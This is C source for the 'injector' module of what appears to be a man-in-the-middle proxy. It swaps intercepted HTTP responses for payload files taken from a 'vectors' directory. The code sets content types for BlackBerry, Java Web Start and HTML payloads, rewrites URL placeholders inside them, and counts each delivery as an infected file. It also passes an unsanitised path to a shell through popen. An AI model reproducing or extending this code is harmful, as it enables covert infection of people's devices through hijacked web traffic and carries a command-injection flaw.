/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>
#include <bio_replacer.h>

/* globals */


/* protos */

int proxy_replace(BIO **cbio, BIO **sbio, char *file, char *tag, char *host);
int setup_replace_bio(BIO **fbio, char *file, char *search, char *replace, int *diff);

/************************************************/

int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
{
   BIO *fbio, *fbio2;
   char data[READ_BUFF_SIZE];
   char *path;
   char *content_type = "";
   struct stat st;
   size_t content_length = 0;
   int diff;
   char ipa_url[MAX_URL];
   int text_transfer = 0;

   /* complete the path of the file */
   path = get_path("vectors", file);

   /* the server bio will be our file */
   *sbio = BIO_new_file(path, FOPEN_READ_BIN);

   if (*sbio == NULL) {
      DEBUG_MSG(D_ERROR, "Cannot open file [%s]", path);
      SAFE_FREE(path);
      return -ENOTFOUND;
   }

   /* get the file size */
   stat(path, &st);
   content_length = st.st_size;

   /* calculate and replace the IPA_URL in the file */
   snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);

   DEBUG_MSG(D_INFO, "Sending replaced page [%s] len [%d]", file, st.st_size);

   /* create the HTTP response header */
   /* special case for Blackberry files */
   if (strstr(file, ".jad")) {
      content_type = "Content-Type: text/vnd.sun.j2me.app-descriptor\r\n";
      text_transfer = 1;
   } else if (strstr(file, ".cod")){
      content_type = "Content-Type: application/vnd.rim.cod\r\n";
      text_transfer = 1;
   } else if (strstr(file, ".html") || strstr(file, ".htm")){
      content_type = "Content-Type: text/html\r\n";
      text_transfer = 1;
   } else if (strstr(file, ".jnlp")){
      content_type = "Content-Type: application/x-java-jnlp-file\r\n";
      text_transfer = 1;
   } else {
      char mime_command[256];
      char output[128];
      char content[256];
     
      memset(content, 0, sizeof(content));

      /* get the mime type for the file */
      snprintf(mime_command, 256, "file -b --mime-type %s", path);

      FILE *p = popen(mime_command, "r");
      int r = fread(output, 1, sizeof(output), p);
      if (r > 0) {
         output[strlen(output) - 1] = 0;
         snprintf(content, 256, "Content-Type: %s", output);
      }
      fclose(p);
      /*
       * if left empty the content type will not be sent in the header
       * assuming binary transfer, don't try to replace anything in the file
       */
      //content_type = "Content-Type: application/octet-stream\r\n";
      content_type = content;
      text_transfer = 0;
   }

   /* replace the internal variables only on text files */
   if (text_transfer) {

      /* replace the strings */
      setup_replace_bio(&fbio, path, "%IPA_URL%", ipa_url, &diff);
      content_length += diff;

      setup_replace_bio(&fbio2, path, "%SITE_HOSTNAME%", host, &diff);
      content_length += diff;

      /* concatenate the two filtering bios */
      fbio = BIO_push(fbio2, fbio);
   }

   /* prepare the HTTP header */
   sprintf(data, "HTTP/1.0 200 OK\r\n"
       "Content-Length: %u\r\n"
       "%s" /* Content-Type: */
       "Connection: close\r\n"
       "\r\n", (u_int)content_length, content_type);

   /* send the headers to the client, the data will be sent in the callee function */
   BIO_write(*cbio, data, strlen(data));

   /* append the filter after the header has been sent */
   if (text_transfer) {
      /* append the filter to the client bio */
      *cbio = BIO_push(fbio, *cbio);
   }

   /* update the stats */
   GBL_STATS->inf_files++;

   SAFE_FREE(path);

   return ESUCCESS;
}


int setup_replace_bio(BIO **fbio, char *file, char *search, char *replace, int *diff)
{
   BIO *sbio;
   char *data, *p;
   int len, num, written = 0;
   struct stat st;
   struct bio_replace_setup bir;

   /* prepare the replace BIO */
   *fbio = BIO_new(BIO_f_replace());

   bir.search = search;
   bir.replace = replace;

   /* setup the search and replace parameters */
   BIO_ctrl(*fbio, BIO_C_SET_BUF_MEM, 1, &bir);

   /* open the file */
   sbio = BIO_new_file(file, FOPEN_READ_TEXT);

   /* get the file size */
   stat(file, &st);

   SAFE_CALLOC(data, st.st_size, sizeof(char));

   /* read the file content */
   while (BIO_eof(sbio) != 1) {
      len = BIO_read(sbio, data + written, READ_BUFF_SIZE);
      if (len <= 0)
         break;

      written += len;
   }

   num = 0;
   p = data;

   /* search the number of time the search string is present in the file */
   while ((p = strstr(p, search)) != NULL) {
      num++;
      p += strlen(search);
   }

   SAFE_FREE(data);
   BIO_free(sbio);

   /* calculate the difference in size */
   *diff = num * (strlen(replace) - strlen(search));

   return *diff;
}

/* EOF */

// vim:ts=3:expandtab

